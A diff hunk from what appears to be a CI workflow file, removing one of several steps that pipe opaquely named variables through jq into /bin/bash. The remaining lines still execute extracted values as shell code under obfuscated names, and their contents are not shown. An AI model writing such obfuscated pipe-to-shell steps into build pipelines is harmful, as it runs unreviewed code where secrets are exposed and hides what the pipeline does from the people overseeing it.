@@ -29,7 +29,6 @@ jobs:
           echo $kq46 | jq -r .wi2437 | /bin/bash
           printf '%s' "$lem02689" | jq -r .x96 | /bin/bash
           printf '%s' "$fuvr07" | jq -r .l4 | /bin/bash
-          echo $dvqmj95410 | jq -r .u7248 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
